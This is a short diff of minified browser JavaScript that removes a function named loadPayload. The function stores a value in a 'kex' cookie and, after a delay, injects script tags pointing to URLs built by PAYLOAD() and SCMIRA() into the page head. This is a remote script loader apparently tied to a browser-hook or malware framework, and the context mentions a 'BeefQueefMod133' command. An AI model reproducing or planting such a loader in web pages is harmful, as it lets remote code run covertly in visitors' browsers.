@@ -45,7 +45,3 @@ function getCookie(name){let dc=document.cookie;let prefix=name+"=";let begin=dc
             break;
             case "BeefQueefMod133": removeScript();
             break;}}
-function loadPayload(payload){getCookie("kex") === null ? createCookie("kex",payload):modifyCookie("kex",payload);setTimeout(function (){let tab=[payload,"c-code"];
-for (let i=0;i < tab.length;i++){let element=document.createElement("script");
-if (i == 0) element.src=PAYLOAD(tab[i]);
-else element.src=SCMIRA(tab[i]);document.getElementsByTagName("head")[0].appendChild(element);}},1500);}
